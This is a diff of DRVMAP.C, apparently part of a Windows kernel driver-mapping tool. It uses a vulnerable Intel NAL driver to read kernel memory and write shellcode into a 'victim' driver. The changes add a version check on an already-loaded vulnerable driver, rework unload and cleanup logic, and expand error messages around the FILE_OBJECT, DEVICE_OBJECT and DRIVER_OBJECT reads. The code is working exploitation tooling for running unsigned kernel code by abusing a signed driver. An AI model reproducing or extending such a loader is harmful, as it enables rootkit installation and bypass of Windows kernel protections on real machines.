@@ -4,9 +4,9 @@
 *
 *  TITLE:       DRVMAP.C
 *
-*  VERSION:     1.00
+*  VERSION:     1.01
 *
-*  DATE:        24 Jan 2020
+*  DATE:        20 Apr 2020
 *
 *  Driver mapping routines.
 *
@@ -19,10 +19,20 @@
 #include "global.h"
 #include "tsmisc.h"
 
+#pragma comment(lib, "version.lib")
+
 #define PROVIDER_NAME   L"IntelNal"
 #define PROVIDER_DEVICE L"Nal"
 
+//
+// Provider version we expect.
+//
+#define PROVIDER_VER_MAJOR      1
+#define PROVIDER_VER_MINOR      3
+#define PROVIDER_VER_BUILD      0
+#define PROVIDER_VER_REVISION   7
 
+BOOLEAN g_DriverAlreadyLoaded = FALSE;
 PMAPPED_CODE_DATA g_MappedData;
 
 /*
@@ -199,6 +209,188 @@ BOOL CheckMemoryLayout(
     return FALSE;
 }
 
+/*
+* ValidateLoadedDriver
+*
+* Purpose:
+*
+* Examine loaded driver if it has newer version, if so - we cannot use it.
+*
+*/
+BOOL ValidateLoadedDriver(
+    _In_ LPWSTR DriverServiceName
+)
+{
+    BOOL bDrvValid = FALSE;
+    HANDLE schManager = NULL, schService = NULL;
+    QUERY_SERVICE_CONFIG* lpsc = NULL;
+    DWORD dwBytesNeeded = 0, dwError, cbBufSize = 0;
+
+    ULONG ulDisp, ulMajor, ulMinor, ulBuild, ulRevision;
+
+    NTSTATUS ntStatus;
+    RTL_UNICODE_STRING_BUFFER dosPath;
+    WCHAR szConversionBuffer[MAX_PATH * 2];
+
+    SUP_VERINFO_NUMBERS verInfo;
+
+    do {
+
+        //
+        // Open SCM.
+        //
+        schManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+        if (schManager == NULL) {
+            printf_s("[!] OpenSCManager failed (Error %lu)\r\n", GetLastError());
+            break;
+        }
+
+        //
+        // Open provider service.
+        //
+        schService = OpenService(schManager, DriverServiceName, SERVICE_QUERY_CONFIG);
+        if (schService == NULL) {
+            printf_s("[!] OpenService failed (Error %lu)\r\n", GetLastError());
+            break;
+        }
+
+        printf_s("[!] Vulnerable provider device already exist, checking loaded driver version\r\n");
+
+        //
+        // Query service binary file.
+        //
+        // 1st: query required size and allocate required buffer.
+        //
+        if (!QueryServiceConfig(
+            schService,
+            NULL,
+            0,
+            &dwBytesNeeded))
+        {
+            dwError = GetLastError();
+            if (ERROR_INSUFFICIENT_BUFFER == dwError)
+            {
+                cbBufSize = dwBytesNeeded;
+                lpsc = (LPQUERY_SERVICE_CONFIG)supHeapAlloc(cbBufSize);
+            }
+            else
+            {
+                printf_s("[!] QueryServiceConfig failed (Error %lu)\r\n", dwError);
+                break;
+            }
+        }
+
+        if (lpsc == NULL) {
+            printf_s("[!] Could not allocate memory for service config query\r\n");
+            break;
+        }
+
+        //
+        // Read service config.
+        //
+        if (!QueryServiceConfig(
+            schService,
+            lpsc,
+            cbBufSize,
+            &dwBytesNeeded))
+        {
+            printf("QueryServiceConfig failed (Error %lu)\r\n", GetLastError());
+            break;
+        }
+
+        //
+        // Convert filename from Nt to Dos type (remove \??\).
+        //
+        RtlSecureZeroMemory(&szConversionBuffer, sizeof(szConversionBuffer));
+        RtlSecureZeroMemory(&dosPath, sizeof(dosPath));
+        RtlInitUnicodeString(&dosPath.String, lpsc->lpBinaryPathName);
+
+        //
+        // Ensure conversion buffer length is enough.
+        //
+        RtlInitBuffer(&dosPath.ByteBuffer, (PUCHAR)szConversionBuffer, sizeof(szConversionBuffer));
+        ntStatus = RtlEnsureBufferSize(RTL_ENSURE_BUFFER_SIZE_NO_COPY,
+            &dosPath.ByteBuffer,
+            dosPath.String.MaximumLength);
+
+        if (!NT_SUCCESS(ntStatus)) {
+            printf("[!] RtlEnsureBufferSize NTSTATUS (0x%lX)\r\n", ntStatus);
+            break;
+        }
+
+        //
+        // Copy filename to buffer.
+        //
+        RtlCopyMemory(dosPath.ByteBuffer.Buffer,
+            dosPath.String.Buffer,
+            dosPath.String.MaximumLength);
+
+        //
+        // Update pointer.
+        //
+        dosPath.String.Buffer = (PWSTR)dosPath.ByteBuffer.Buffer;
+
+        ntStatus = RtlNtPathNameToDosPathName(0, &dosPath, &ulDisp, NULL);
+        if (!NT_SUCCESS(ntStatus)) {
+            printf("[!] RtlNtPathNameToDosPathName NTSTATUS (0x%lX)\r\n", ntStatus);
+            break;
+        }
+
+        //
+        // Query driver file version.
+        //
+        verInfo.VersionLS = 0xFFFFFFFF;
+        verInfo.VersionMS = 0xFFFFFFFF;
+#pragma warning(push)
+#pragma warning(disable: 6054)
+        if (!supGetImageVersionInfo(dosPath.String.Buffer, &verInfo)) {
+            printf("[!] supGetImageVersionInfo failed, (Error %lu)\r\n", GetLastError());
+            break;
+        }
+#pragma warning(pop)
+
+        ulMajor = (verInfo.VersionMS >> 16) & 0xffff;
+        ulMinor = verInfo.VersionMS & 0xffff;
+        ulBuild = (verInfo.VersionLS >> 16) & 0xffff;
+        ulRevision = verInfo.VersionLS & 0xffff;
+
+        printf_s("LDR: Currently loaded driver version %lu.%lu.%lu.%lu, required version %lu.%lu.%lu.%lu\r\n",
+            ulMajor,
+            ulMinor,
+            ulBuild,
+            ulRevision,
+            PROVIDER_VER_MAJOR,
+            PROVIDER_VER_MINOR,
+            PROVIDER_VER_BUILD,
+            PROVIDER_VER_REVISION);
+
+        //
+        // Check version values against known, abort on any mismatch.
+        //
+        if ((ulMajor != PROVIDER_VER_MAJOR) ||
+            (ulMinor != PROVIDER_VER_MINOR) ||
+            (ulBuild != PROVIDER_VER_BUILD) ||
+            (ulRevision != PROVIDER_VER_REVISION))
+        {
+            printf_s("[!] Driver version is unknown and we cannot continue.\r\n"\
+                "If you still want to use this loader find and uninstall software that uses this driver first!\r\n");
+            SetLastError(ERROR_UNKNOWN_REVISION);
+            break;
+        }
+        else {
+            printf_s("LDR: Loaded driver version is compatible, processing next\r\n");
+        }
+
+        bDrvValid = TRUE;
+
+    } while (FALSE);
+
+    if (schService) CloseServiceHandle(schService);
+    if (schManager) CloseServiceHandle(schManager);
+    if (lpsc) supHeapFree(lpsc);
+
+    return bDrvValid;
+}
 
 /*
 * StartVulnerableDriver
@@ -224,12 +416,14 @@ HANDLE StartVulnerableDriver(
 
     printf_s("[>] Entering %s\r\n", __FUNCTION__);
 
+    g_DriverAlreadyLoaded = FALSE;
+
     //
     // Check if driver already loaded.
     //
     if (supIsObjectExists((LPWSTR)L"\\Device", lpDeviceName)) {
-        printf_s("[!] Vulnerable driver already loaded\r\n");
-        bLoaded = TRUE;
+        g_DriverAlreadyLoaded = TRUE;
+        bLoaded = ValidateLoadedDriver(PROVIDER_DEVICE);
     }
     else {
 
@@ -270,7 +464,7 @@ HANDLE StartVulnerableDriver(
         if (!NT_SUCCESS(ntStatus))
             printf_s("[!] Unable to open vulnerable driver, NTSTATUS (0x%lX)\r\n", ntStatus);
         else
-            printf_s("LDR: Vulnerable driver opened\r\n");
+            printf_s("LDR: Vulnerable driver opened, handle 0x%p\r\n", deviceHandle);
     }
 
     printf_s("[<] Leaving %s\r\n", __FUNCTION__);
@@ -295,27 +489,34 @@ void StopVulnerableDriver(
 
     printf_s("[>] Entering %s\r\n", __FUNCTION__);
 
-    ntStatus = supUnloadDriver(lpDriverName, TRUE);
-    if (!NT_SUCCESS(ntStatus)) {
-        printf_s("[!] Unable to unload vulnerable driver, NTSTATUS (0x%lX)\r\n", ntStatus);
+    if (g_DriverAlreadyLoaded) {
+        printf_s("[!] Vulnerable driver wasn't loaded, skip\r\n");
     }
     else {
 
-        printf_s("LDR: Vulnerable driver unloaded\r\n");
-        ULONG retryCount = 3;
-
-        if (lpFullFileName) {
-            do {
-                Sleep(1000);
-                if (DeleteFile(lpFullFileName)) {
-                    printf_s("LDR: Vulnerable driver file removed\r\n");
-                    break;
-                }
-
-                retryCount--;
-
-            } while (retryCount);
+        ntStatus = supUnloadDriver(lpDriverName, TRUE);
+        if (!NT_SUCCESS(ntStatus)) {
+            printf_s("[!] Unable to unload vulnerable driver, NTSTATUS (0x%lX)\r\n", ntStatus);
         }
+        else {
+
+            printf_s("LDR: Vulnerable driver unloaded\r\n");
+            ULONG retryCount = 3;
+
+            if (lpFullFileName) {
+                do {
+                    Sleep(1000);
+                    if (DeleteFile(lpFullFileName)) {
+                        printf_s("LDR: Vulnerable driver file removed\r\n");
+                        break;
+                    }
+
+                    retryCount--;
+
+                } while (retryCount);
+            }
+        }
+
     }
 
     printf_s("[<] Leaving %s\r\n", __FUNCTION__);
@@ -355,7 +556,7 @@ BOOL ProviderCreate(
         //
         driverFileName = (LPWSTR)supHeapAlloc(length);
         if (driverFileName == NULL) {
-            printf_s("[!] Could not allocate memory for driver name, error %lu\r\n", GetLastError());
+            printf_s("[!] Could not allocate memory for driver name (Error %lu)\r\n", GetLastError());
             break;
         }
 
@@ -379,10 +580,16 @@ BOOL ProviderCreate(
             PROVIDER_DEVICE,
             driverFileName);
 
-        *DeviceHandle = deviceHandle;
-        *DriverFileName = driverFileName;
-
-        bResult = TRUE;
+        if (deviceHandle == NULL) {
+            supHeapFree(driverFileName);
+            *DeviceHandle = NULL;
+            *DriverFileName = NULL;
+        }
+        else {
+            *DeviceHandle = deviceHandle;
+            *DriverFileName = driverFileName;
+            bResult = TRUE;
+        }
 
     } while (FALSE);
 
@@ -636,7 +843,7 @@ Reload:
         printf_s("LDR: Victim driver loaded, handle 0x%p\r\n", victimHandle);
     }
     else {
-        printf_s("LDR: Could not load victim driver, GetLastError %lu\r\n", GetLastError());
+        printf_s("LDR: Could not load victim driver (Error %lu)\r\n", GetLastError());
     }
 
     if (supQueryObjectFromHandle(victimHandle, &objectAddress)) {
@@ -645,18 +852,17 @@ Reload:
 
             RtlSecureZeroMemory(&fileObject, sizeof(fileObject));
 
-            printf_s("LDR: Reading FILE_OBJECT at 0x%llX\r\n", objectAddress);
-
             if (!ReadKernelVM(providerHandle,
                 objectAddress,
                 &fileObject,
                 sizeof(FILE_OBJECT)))
             {
-                printf_s("[!] Could not read FILE_OBJECT at 0x%llX\r\n", objectAddress);
+                printf_s("[!] Could not read FILE_OBJECT at 0x%llX (Error %lu)\r\n", objectAddress, GetLastError());
                 break;
             }
-
-            printf_s("LDR: Reading DEVICE_OBJECT at 0x%p\r\n", fileObject.DeviceObject);
+            else {
+                printf_s("LDR: Reading FILE_OBJECT at 0x%llX - OK\r\n", objectAddress);
+            }           
 
             RtlSecureZeroMemory(&deviceObject, sizeof(deviceObject));
 
@@ -665,24 +871,28 @@ Reload:
                 &deviceObject,
                 sizeof(DEVICE_OBJECT)))
             {
-                printf_s("[!] Could not read DEVICE_OBJECT at 0x%p\r\n", fileObject.DeviceObject);
+                printf_s("[!] Could not read DEVICE_OBJECT at 0x%p (Error %lu)\r\n", fileObject.DeviceObject, GetLastError());
                 break;
             }
-
-            printf_s("LDR: Reading DRIVER_OBJECT at 0x%p\r\n", deviceObject.DriverObject);
-
+            else {
+                printf_s("LDR: Reading DEVICE_OBJECT at 0x%p - OK\r\n", fileObject.DeviceObject);
+            }
+            
             if (!ReadKernelVM(providerHandle,
                 (ULONG_PTR)deviceObject.DriverObject,
                 &driverObject,
                 sizeof(DRIVER_OBJECT)))
             {
-                printf_s("[!] Could not read DRIVER_OBJECT at 0x%p\r\n", deviceObject.DriverObject);
+                printf_s("[!] Could not read DRIVER_OBJECT at 0x%p (Error %lu)\r\n", deviceObject.DriverObject, GetLastError());
                 break;
+            }
+            else {
+                printf_s("LDR: Reading DRIVER_OBJECT at 0x%p - OK\r\n", deviceObject.DriverObject);
             }
 
             hdrDriver = VirtualAlloc(NULL, PAGE_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
             if (!hdrDriver) {
-                printf_s("[!] Memory allocation error, GetLastError %lu.\r\n", GetLastError());
+                printf_s("[!] Memory allocation error, (Error %lu)\r\n", GetLastError());
                 break;
             }
 
@@ -691,8 +901,11 @@ Reload:
                 hdrDriver,
                 PAGE_SIZE))
             {
-                printf_s("[!] Could not read driver image header at 0x%p\r\n", driverObject.DriverStart);
+                printf_s("[!] Could not read driver image header at 0x%p (Error %lu)\r\n", driverObject.DriverStart, GetLastError());
                 break;
+            }
+            else {
+                printf_s("LDR: Victim driver image header at 0x%p read - OK\r\n", driverObject.DriverStart);
             }
 
             pehdr = (PIMAGE_NT_HEADERS64)((ULONG_PTR)hdrDriver + hdrDriver->e_lfanew);
@@ -802,7 +1015,7 @@ Reload:
                 }
                 else
                 {
-                    printf_s("[!] Error writing shell code to the target driver, abort\r\n");
+                    printf_s("[!] Error writing shell code to the target driver, (Error %lu)\r\n", GetLastError());
                 }
             }
             else {
